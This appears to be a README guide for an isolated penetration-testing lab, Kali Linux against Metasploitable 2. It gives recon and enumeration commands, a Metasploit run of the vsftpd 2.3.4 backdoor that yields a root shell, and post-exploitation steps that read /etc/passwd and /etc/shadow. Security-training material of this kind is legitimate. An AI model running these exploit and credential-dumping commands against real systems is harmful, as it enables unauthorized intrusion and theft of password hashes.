# 🛡️ A Detailed guide to setting up a safe and Real world penetration testing lab.
<p align="center">
  <img src="https://img.shields.io/badge/Lab-Environment-blue?style=for-the-badge" />
  <img src="https://img.shields.io/badge/Attacker-Kali%20Linux-green?style=for-the-badge" />
  <img src="https://img.shields.io/badge/Target-Metasploitable-red?style=for-the-badge" />
  <img src="https://img.shields.io/badge/Status-Active-orange?style=for-the-badge" />
</p>

---

## 🔹 Lab Overview

This lab provides a **safe, isolated, real-world environment** to practice penetration testing techniques from reconnaissance to post-exploitation.

**Lab Components:**

| Machine   | OS             | IP Address       | Role                        |
|----------|----------------|----------------|----------------------------|
| Attacker | Kali Linux     | 192.168.142.128 | Pentester machine          |
| Target   | Metasploitable 2 | 192.168.142.130 | Vulnerable machine         |

**Lab Objective:**  
- Simulate real-world penetration testing scenarios.  
- Gain hands-on experience with scanning, enumeration, exploitation, and reporting.  

## 🔹 Lab Setup

### 1. Requirements

* **Virtualization software:** VirtualBox or VMware
* **Attacker VM:** Kali Linux
* **Target VM:** Metasploitable 2
* **Network isolation:** Internal network or host-only adapter
* **Snapshots:** Take snapshots before starting

### 2. Network Configuration

1. Set VMs to **Host-Only Adapter**:

   * Attacker: 192.168.142.128
   * Target: 192.168.142.130
 
2. Verify connectivity:

```bash
ping 192.168.142.130
```
  <p align="center">
  <img src="https://github.com/ZeeshanKeyani/Real-world-penetration-testing-environment-in-a-safe-isolated-network./blob/main/img/3-metasploit.JPG" />
</p>


## 🔹 Step-by-Step Penetration Testing

### Step 1: Reconnaissance

#### Passive Recon

```bash
whois 192.168.142.130
<img width="666" height="322" alt="image" src="https://github.com/user-attachments/assets/df545864-2861-4dcd-a5c5-62dd1f989aaa" />

```

* Collect IP, domain, and server info.
* No interaction with target.

#### Active Recon

```bash
nmap -sS -Pn 192.168.142.130
nmap -p- -A -T4 192.168.142.130
```

**Example Output:**

```
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 2.3.4
22/tcp   open  ssh     OpenSSH 4.7p1
23/tcp   open  telnet
80/tcp   open  http    Apache 2.2.8
139/tcp  open  netbios-ssn Samba smbd 3.X
445/tcp  open  netbios-ssn Samba smbd 3.X
```

---

### Step 2: Enumeration

#### FTP Enumeration

```bash
nc 192.168.142.130 21
```

* Check banner for service version.

```bash
ftp 192.168.142.130
# Attempt anonymous login
```

#### SMB Enumeration

```bash
smbclient -L \\192.168.142.130 -U guest
enum4linux -a 192.168.142.130
```

---

### Step 3: Vulnerability Analysis

* Use **Searchsploit** to identify exploits:

```bash
searchsploit vsftpd 2.3.4
searchsploit samba
```

* Check Metasploit modules:

```bash
msfconsole
search vsftpd
```

---

### Step 4: Exploitation

#### Example: FTP Backdoor

```bash
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST 192.168.142.130
exploit
```

#### Verify Access

```bash
whoami
id
```

**Expected Output:**

```
uid=0(root) gid=0(root) groups=0(root)
```

---

### Step 5: Post-Exploitation

* System enumeration:

```bash
uname -a
cat /etc/passwd
ifconfig
```

* Privilege escalation check:

```bash
sudo -l
```

* Dump hashes or sensitive info (for lab purposes only):

```bash
cat /etc/shadow
```


### Step 6: Reporting

* Document all findings.
* Include screenshots and proof-of-concept.

**Report Template:**

| Vulnerability        | Exploit Used          | Impact              | Mitigation                                   |
| -------------------- | --------------------- | ------------------- | -------------------------------------------- |
| FTP Backdoor         | vsftpd 2.3.4          | Remote Shell Access | Upgrade FTP server / Disable anonymous login |
| SMB Misconfiguration | Metasploit smb module | Data Exposure       | Patch Samba / Restrict SMB access            |

---

## 🔹 Recommended Tools

| Tool                   | Purpose                           |
| ---------------------- | --------------------------------- |
| Nmap / Zenmap          | Port scanning & service discovery |
| Netcat                 | Banner grabbing & connectivity    |
| Metasploit             | Exploit development & execution   |
| Nikto / Dirb           | Web vulnerability scanning        |
| Enum4linux / smbclient | Windows/SMB enumeration           |
| Wireshark              | Network traffic analysis          |

---

## 🔹 Best Practices

1. Always **take snapshots** before testing.
2. Use **isolated lab networks**.
3. Document each phase with screenshots and notes.
4. Never attack systems **without permission**.

---

## 🔹 References

* [Metasploitable 2 VM](https://sourceforge.net/projects/metasploitable/)
* [Kali Linux Tools](https://www.kali.org/tools/)
* [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)

---

> ⚠️ **Disclaimer:**
> This lab is for **educational purposes only**. Unauthorized penetration testing is illegal and unethical.

